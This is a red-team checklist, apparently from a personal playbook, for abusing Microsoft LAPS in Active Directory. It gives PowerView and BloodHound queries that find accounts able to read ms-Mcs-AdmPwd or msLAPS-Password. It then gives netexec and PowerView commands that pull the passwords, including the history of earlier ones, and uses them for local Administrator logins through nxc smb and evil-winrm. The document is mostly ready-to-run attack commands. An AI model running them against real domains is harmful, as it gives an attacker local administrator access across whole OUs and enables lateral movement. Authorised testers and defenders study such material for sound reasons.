# LAPS abuse

## Before I start
- [ ] LAPS is deployed: ms-Mcs-AdmPwd, the legacy attribute, or msLAPS-Password, Windows LAPS, on computer objects
- [ ] An account that may read that attribute for some OU, often helpdesk or workstation administrators

## Who can read it
- [ ] BloodHound: the ReadLAPSPassword edge on each computer
- [ ] With PowerView loaded, as in :Pb domain-enum: Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ObjectAceType -match 'ms-Mcs-AdmPwd|msLAPS-Password'}

## Read the passwords
At the pwn-broker prompt: tool install netexec.
nxc ldap <DCIP> -u '<Username>' -p '<Password>' -M laps
One computer only:
nxc ldap <DCIP> -u '<Username>' -p '<Password>' -M laps -o COMPUTER=<Hostname>
From a domain host, with PowerView loaded:
Get-DomainComputer <Hostname> -Properties ms-Mcs-AdmPwd
Get-DomainComputer <Hostname> -Properties 'msLAPS-Password','msLAPS-PasswordHistory'
- [ ] The legacy attribute is plain text in the answer
- [ ] Windows LAPS may store it encrypted: Get-LapsADPassword -Identity <Hostname> -AsPlainText decrypts it for an account with the right
- [ ] msLAPS-PasswordHistory gives the earlier passwords, still good on hosts that missed a rotation

## Use them
nxc smb <TargetIP> -u Administrator -p 'THE-LAPS-PASSWORD' --local-auth
evil-winrm -i <TargetIP> -u Administrator -p 'THE-LAPS-PASSWORD'
- [ ] A local account: --local-auth, and no domain at the login
Read and used in one step, by an account that may read it:
nxc smb <TargetIP> -d <Domain> -u '<Username>' -p '<Password>' --laps
- [ ] Whoever may read LAPS owns every host under that OU: if I cannot read it, an account that can, :Pb acl-abuse
- [ ] The same password on several machines: rotation is broken or the image was cloned, so tried on all of them, and written up
